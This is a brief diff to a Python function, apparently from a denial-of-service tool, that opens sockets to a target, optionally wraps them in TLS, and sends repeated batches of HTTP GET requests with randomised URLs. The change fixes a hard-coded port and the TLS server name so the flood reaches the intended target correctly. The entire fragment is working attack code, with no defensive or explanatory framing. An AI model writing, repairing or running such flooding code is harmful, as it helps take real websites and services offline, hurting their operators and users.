@@ -251,10 +251,10 @@ def cc(event,proxy_type):
 			# s.connect((str(target), int(port)))
 			if ip!="": target_host = ip
 			else: target_host = target
-			s.connect((str(target_host), int(9999)))
+			s.connect((str(target_host), int(port)))
 			if protocol == "https":
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
+				s = ctx.wrap_socket(s,server_hostname=target_host)
 			try:
 				for _ in range(100):
 					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
